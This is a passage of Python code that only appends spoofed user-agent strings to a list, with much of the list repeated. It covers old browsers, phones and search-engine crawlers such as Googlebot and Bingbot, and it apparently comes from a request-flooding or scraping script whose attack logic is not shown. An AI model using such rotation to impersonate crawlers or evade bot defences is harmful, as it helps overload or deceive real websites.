	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
	headers_useragents.append('Googlebot/2.1 (http://www.googlebot.com/bot.html)')
	headers_useragents.append('Opera/9.20 (Windows NT 6.0; U; en)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)')
	headers_useragents.append('Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7')
	headers_useragents.append('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; AOL 9.7; AOLBuild 4343.19; Windows NT 6.1; WOW64; Trident/5.0; FunWebProducts)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.27; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.21; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; GTB7.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.7; AOLBuild 4343.19; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0C; .NET4.0E)')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; de-de; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1 (.NET CLR 3.0.04506.648)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
	headers_useragents.append('Opera/9.60 (J2ME/MIDP; Opera Mini/4.2.14912/812; U; ru) Presto/2.4.15')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en-US) AppleWebKit/125.4 (KHTML, like Gecko, Safari) OmniWeb/v563.57')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 NokiaN95_8GB/31.0.015; Profile/MIDP-2.0 Configuration/CLDC-1.1 ) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.8.0.5) Gecko/20060706 K-Meleon/1.0')
	headers_useragents.append('Lynx/2.8.6rel.4 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.8g')
	headers_useragents.append('Mozilla/4.76 [en] (PalmOS; U; WebPro/3.0.1a; Palm-Arz1)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; de-de) AppleWebKit/418 (KHTML, like Gecko) Shiira/1.2.2 Safari/125')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.8.1.6) Gecko/2007072300 Iceweasel/2.0.0.6 (Debian-2.0.0.6-0etch1+lenny1)')
	headers_useragents.append('Mozilla/5.0 (SymbianOS/9.1; U; en-us) AppleWebKit/413 (KHTML, like Gecko) Safari/413')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 3.5.30729; InfoPath.2)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
	headers_useragents.append('Links (2.2; GNU/kFreeBSD 6.3-1-486 i686; 80x25)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; WOW64; Trident/4.0; SLCC1)')
	headers_useragents.append('Mozilla/1.22 (compatible; Konqueror/4.3; Linux) KHTML/4.3.5 (like Gecko)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows CE; IEMobile 6.5)')
	headers_useragents.append('Opera/9.80 (Macintosh; U; de-de) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.9) Gecko/20100318 Mandriva/2.0.4-69.1mib2010.0 SeaMonkey/2.0.4')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP) Gecko/20060706 IEMobile/7.0')
	headers_useragents.append('Mozilla/5.0 (iPad; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10')
	headers_useragents.append('Mozilla/5.0 (Macintosh; I; Intel Mac OS X 10_6_7; ru-ru)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 6.0; Windows NT 6.1; Trident/4.0; GTB6; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; OfficeLiveConnector.1.4; OfficeLivePatch.1.3)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; Intel Mac OS X 10_6_7; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.205 Safari/534.16')
	headers_useragents.append('Mozilla/1.22 (X11; U; Linux x86_64; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.0.30729; InfoPath.2)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 2.0; Windows CE; IEMobile 7.0)')
	headers_useragents.append('Mozilla/4.0 (Macintosh; U; PPC Mac OS X; en-US)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.0; en; rv:1.9.1.7) Gecko/20091221 Firefox/3.5.7')
	headers_useragents.append('BlackBerry8300/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/107 UP.Link/6.2.3.15.0')
	headers_useragents.append('Mozilla/1.22 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Avant Browser [avantbrowser.com]; iOpus-I-M; QXW03416; .NET CLR 1.1.4322)')
	headers_useragents.append('Mozilla/3.0 (Windows NT 6.1; ru-ru; rv:1.9.1.3.) Win32; x86 Firefox/3.5.3 (.NET CLR 2.0.50727)')
	headers_useragents.append('Opera/7.0 (compatible; MSIE 2.0; Windows 3.1)')
	headers_useragents.append('Opera/9.80 (Windows NT 5.1; U; en-US) Presto/2.8.131 Version/11.10')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; America Online Browser 1.1; rev1.5; Windows NT 5.1;)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows CE 4.21; rv:1.8b4) Gecko/20050720 Minimo/0.007')
	headers_useragents.append('BlackBerry9000/5.0.0.93 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/179')
	headers_useragents.append('Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0) AddSugarSpiderBot www.idealobserver.com')
	headers_useragents.append('Mozilla/5.0 (compatible; AnyApexBot/1.0; +http://www.anyapex.com/bot.html)')
	headers_useragents.append('Mozilla/4.0 (compatible; Arachmo)')
	headers_useragents.append('Mozilla/4.0 (compatible; B-l-i-t-z-B-O-T)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)')
	headers_useragents.append('Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)')
	headers_useragents.append('BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)')
	headers_useragents.append('Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)')
	headers_useragents.append('Sqworm/2.9.85-BETA (beta_release; 20011115-775; i686-pc-linux-gnu)')
	headers_useragents.append('Mozilla/5.0 (compatible; YandexImages/3.0; +http://yandex.com/bots)')
	headers_useragents.append('Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)')
	headers_useragents.append('Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)')
	headers_useragents.append('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser 1.98.744; .NET CLR 3.5.30729)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; Acoo Browser; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; Avant Browser)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Acoo Browser; GTB6; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; InfoPath.1; .NET CLR 3.5.30729; .NET CLR 3.0.30618)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; Acoo Browser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; U; PPC Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko, Safari/419.3) Cheshire/1.0.ALPHA')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, like Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.10 (KHTML, like Gecko) Chrome/8.0.552.215 Safari/534.10 ChromePlus/1.5.1.1')
	headers_useragents.append('Links (2.7; Linux 3.7.9-2-ARCH x86_64; GNU C 4.7.1; text)')
	headers_useragents.append('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 3.55)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 2.00)')
	headers_useragents.append('Mozilla/5.0 (PLAYSTATION 3; 1.00)')
	headers_useragents.append('Mozilla/5.0 (Windows NT 6.3; WOW64; rv:24.0) Gecko/20100101 Thunderbird/24.4.0')
	headers_useragents.append('Mozilla/5.0 (compatible; AbiLogicBot/1.0; +http://www.abilogic.com/bot.html)')
	headers_useragents.append('SiteBar/3.3.8 (Bookmark Server; http://sitebar.org/)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('iTunes/9.0.3 (Macintosh; U; Intel Mac OS X 10_6_2; en-ca)')
	headers_useragents.append('Mozilla/4.0 (compatible; WebCapture 3.0; Macintosh)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (FM Scene 4.6.1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; de; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 (.NET CLR 3.5.30729) (Prevx 3.0.5) ')
	headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.8) Gecko/20071004 Iceweasel/2.0.0.8 (Debian-2.0.0.6+2.0.0.8-Oetch1)')
	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.0.1) Gecko/20060111 Firefox/1.5.0.1')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)')
	headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)')
